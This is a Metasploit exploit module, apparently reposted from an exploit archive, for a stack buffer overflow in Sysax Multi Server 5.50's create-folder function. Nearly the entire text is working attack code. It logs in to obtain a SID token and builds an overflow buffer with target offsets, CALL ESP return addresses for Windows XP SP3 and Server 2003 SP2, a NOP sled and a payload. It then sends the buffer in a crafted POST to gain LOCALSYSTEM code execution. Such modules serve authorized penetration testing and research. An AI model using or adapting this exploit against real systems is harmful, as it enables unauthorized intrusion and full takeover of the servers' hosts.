#Title: Sysax Multi Server 5.50 Create Folder Remote Code Exec BoF (MSF Module)
#Author: Craig Freyman (@cd1zz)
#Tested on: XP SP3 32bit and Server 2003 SP2 32bit(No DEP)
#Notes: My original exploit => http://www.exploit-db.com/exploits/18382/
#did not automate the SID gathering process, but this one does. Thanks to todb for the pointers.
##########################################################################################################
 
require &#039;msf/core&#039;
require &#039;base64&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;      => &#039;Sysax Multi Server 5.50 Create Folder BoF&#039;,
            &#039;Description&#039;   => %q{
                    This module exploits a stack buffer overflow in the create folder function
                    in Sysax Multi Server 5.50. This issue was fixed in 5.52.
 
                    You must have valid credentials to trigger the vulnerability. Your credentials
                    must also have the create folder permission and the HTTP option has to be enabled.
                    This module will log into the server, get your a SID token and then proceed to exploit
                    the server. Successful exploits result in LOCALSYSTEM access. This exploit works on
                    XP and 2003. My original exploit did not automate the SID gathering process.
            },
            &#039;License&#039;   => MSF_LICENSE,
            &#039;Author&#039;    => &#039;Craig Freyman @cd1zz&#039;,
            &#039;Version&#039;   => &#039;$Revision:$&#039;,
            &#039;References&#039;    =>
                [
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/18382/&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.pwnag3.com/2012/01/sysax-multi-server-550-exploit.html&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Platform&#039;  => &#039;win&#039;,
            &#039;Payload&#039;   =>
                {
                    &#039;BadChars&#039; => "\x00\x2F",
                },
 
            &#039;Targets&#039;       =>
                [
                    [ &#039;Windows XP SP3&#039;,
                        {
                            &#039;Ret&#039;       =>   0x7C8369F0, #7C8369F0 CALL ESP kernel32.dll
                            &#039;Offset&#039;    =>   667
                        }
                    ],
                    [ &#039;Windows Server 2003 SP2&#039;,
                        {
                            &#039;Ret&#039;       =>   0x77E5F2DF, #77E5F2DF CALL ESP kernel32.dll
                            &#039;Offset&#039;    =>   648
                        }
                    ]
                ],
            &#039;Privileged&#039;    => false,
            &#039;DisclosureDate&#039;=> &#039;January 15, 2012&#039;,
            &#039;DefaultTarget&#039; => 0))
 
        register_options(
                [
                    OptString.new(&#039;URI&#039;, [false, "URI for Multi Server", &#039;/&#039;]),
                    Opt::RPORT(80),
                    OptString.new(&#039;SysaxUSER&#039;, [ true, "Username" ]),
                    OptString.new(&#039;SysaxPASS&#039;, [ true, "Password" ])
                ], self.class)
         
    end
 
    def target_url
        "http://#{rhost}:#{rport}#{datastore[&#039;URI&#039;]}"
    end
 
    def exploit
         
        user = datastore[&#039;SysaxUSER&#039;]
        pass = datastore[&#039;SysaxPASS&#039;]
         
        #base64 encode the credentials
        encodedcreds = Base64.encode64(user+"\x0a"+pass)
        creds = "fd="+encodedcreds
 
        connect
 
        # Login to get SID value
        print_status "Getting SID from #{target_url}"
        res = send_request_raw({
            &#039;method&#039;=> &#039;POST&#039;,
            &#039;uri&#039;   => "#{target_url}/scgi?sid=0&pid=dologin",
            &#039;data&#039;  => creds
        },20)
         
        #parse response for SID token
        sid = res.body.match (/(sid=[A-Z0-9a-z]{40})/)
        print_status "Your " + sid.to_s
 
        buffer =  rand_text(target[&#039;Offset&#039;])  
        buffer << [target.ret].pack(&#039;V&#039;) 
        buffer << make_nops(50)
        buffer << payload.encoded #max 1299 bytes
         
        #pwnag3 post data
        post_data = "scgi?"+sid.to_s+"&pid=mk_folder2_name1.htm HTTP/1.1\r\n"
        post_data << "Content-Length: 171\r\n\r\n"
        post_data << "-----------------------------1190753071675116720811342231\r\n"
        post_data << "Content-Disposition: form-data; name=\"e2\"\r\n\r\n"
        post_data << buffer+"\r\n"
        post_data << "-----------------------------1190753071675116720811342231--\r\n\r\n"
         
        referer = "http://"+datastore[&#039;RHOST&#039;].to_s+"/scgi?"+sid.to_s+"&pid=mk_folder1_name1.htm"
                 
        send_request_raw({
            &#039;uri&#039;     => "/" + post_data,
            &#039;version&#039; => &#039;1.1&#039;,
            &#039;method&#039;  => &#039;POST&#039;,
            &#039;referer&#039; => referer
        })
 
        handler
        disconnect
 
    end
end



